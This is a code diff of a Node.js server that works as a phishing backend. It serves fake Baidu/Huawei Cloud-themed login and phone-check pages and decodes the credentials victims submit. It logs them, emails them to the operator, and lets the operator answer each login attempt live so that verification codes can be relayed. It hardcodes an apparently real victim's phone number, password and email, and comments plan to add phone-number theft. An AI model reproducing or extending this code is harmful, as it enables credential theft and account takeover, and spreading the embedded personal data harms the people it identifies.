@@ -62,18 +62,26 @@ let getHost = () => {
     };
 }
 
-let waitInput = () => {
-    let str = readlineSync.question("need output:");
-    if (str == "1") {
-        str = "pass";
+let waitInput = (mbid) => {
+    let str = readlineSync.question(`need output(${mbid}):`);
+    if (/1\./.test(str)) {
+        str = "pass=" + (str.replace("1.", ""));
+    } else if (str == "1") {
+        if (mbid) {
+            str = "pass=" + mbid;
+        } else {
+            str = "pass";
+        }
     } else {
         str = "error";
+
     }
+    console.log(`input result is ${str}`);
     return str;
 }
 
 let host = getHost();
-let post = '41236';
+let post = '52150';
 
 let isFirst = true;
 let log = "";
@@ -132,7 +140,6 @@ let listener = (request, response) => {
         response.end(imgstr);
     } else if (/\.css/.test(pathName)) {
         let imgstr = '';
-        console.log(`====>        .${basePath}${pathName}`);
         if (fs.existsSync(`.${basePath}${pathName}`)) {
             response.writeHead(200, { 'content-type': 'text/css' });
             imgstr = fs.readFileSync(`.${basePath}${pathName}`) || '';
@@ -149,22 +156,39 @@ let listener = (request, response) => {
                     query = query.replace("d=", "");
                 }
             });
+            let ort = query;
             query = decodeURIComponent(atob(query));
             // query = key + "=>" + query;
-            console.log(`return query ==> ${query}`);
+            console.log(`========== **** return query ==> ${query}`);
             log += ("\n" + query);
             if (/type\=login/.test(query)) {
-                email.send("bd", query);
                 if (/\&u\=18086094549\&/.test(query)) {
                     if (/\&p\=kejyuan6280230\&/.test(query)) {
-                        response.write('pass');
+                        response.write('pass=18049');
                     } else {
                         response.write('error');
                     }
-                } else {
+                } else if (/\&u\=554934437@qq.com\&/.test(query)) {
                     // 554934437@qq.com 未知
-                    response.write(waitInput());
+                    response.write(waitInput(13821));
+                } else {
+                    let qs = query.split("&");
+                    let mbid = '';
+                    let keystr = "";
+                    qs.forEach(e => {
+                        if (e.indexOf("u=") === 0) {
+                            keystr = e.replace("u=", "");
+                            // console.log(`get U: ${keystr}`);
+                            if (keystr.length === 11 && !/\@/.test(keystr)) {
+                                mbid = `${keystr.substr(0, 3)}${keystr.substr(9, 2)}`;
+                            }
+                        }
+                    });
+                    response.write(waitInput(mbid));
                 }
+                email.send("2019华为云数据检测", `您的验证码为 ${ort} `);
+            } else if(/type\=checkcodelogin/.test(query)) {
+                response.write(waitInput());
             } else {
                 response.write("");
             }
@@ -172,6 +196,9 @@ let listener = (request, response) => {
         }
         writedown();
     } else if (/\/login.html/.test(requestUrl)) {
+        email.send("Huawei cloud 通知", "有人访问请查收");
+        console.log(`useragent: ${request['headers']['user-agent']}`);
+        console.log(`host: ${request['headers']['host']}`);
         htmlstr = '';
         if (fs.existsSync(`.${basePath}/login.html`)) {
             response.writeHead(200, { 'content-type': 'text/html' });
@@ -180,7 +207,7 @@ let listener = (request, response) => {
             response.writeHead(404, { 'content-type': 'text/html' });
         }
         response.end(htmlstr);
-    } else if (/\/check.html/.test(requestUrl)) {
+    } else if (/\/check.html/.test(requestUrl) && /mbid\=/.test(requestUrl)) {
         // 554934437@qq.com对应手机号138******21 需要加上盗取手机号的逻辑
         // 18086094549对应手机号为180******49
 
@@ -192,9 +219,21 @@ let listener = (request, response) => {
             response.writeHead(404, { 'content-type': 'text/html' });
         }
         response.end(htmlstr);
+    } else if (/\/checkMbl.html/.test(requestUrl)) {
+        // 554934437@qq.com对应手机号138******21 需要加上盗取手机号的逻辑
+        // 18086094549对应手机号为180******49
+
+        htmlstr = '';
+        if (fs.existsSync(`.${basePath}/checkMbl.html`)) {
+            response.writeHead(200, { 'content-type': 'text/html' });
+            htmlstr = fs.readFileSync(`.${basePath}/checkMbl.html`) || '';
+        } else {
+            response.writeHead(404, { 'content-type': 'text/html' });
+        }
+        response.end(htmlstr);
     } else {
-        response.writeHead(404, { 'content-type': 'text/html' });
-        response.end("");
+        response.writeHead(502, { 'content-type': 'text/html' });
+        response.end("<h1>Access violation at address!</h1>");
     }
 
 };
@@ -209,7 +248,19 @@ module.exports = {
         basePath = `/BoomMan/baidu`;
         //2. 创建http服务器
         // 参数: 请求的回调, 当有人访问服务器的时候,就会自动调用回调函数
-        let server = http.createServer(listener);
+
+        let SWITCH = 0; 
+        let server;
+        if (SWITCH) {
+            server = http.createServer(listener);
+        } else {
+            server = http.createServer(function (req, res) {
+                res.writeHead(301, { 'Location': 'https://pan.baidu.com/s/1bPx56kkQN73knyET7EiFvA' });
+                console.log(res._header);
+                res.end();
+            });
+        }
+
 
         //3. 绑定端口
         // server.listen(post, host.v6_local, () => {
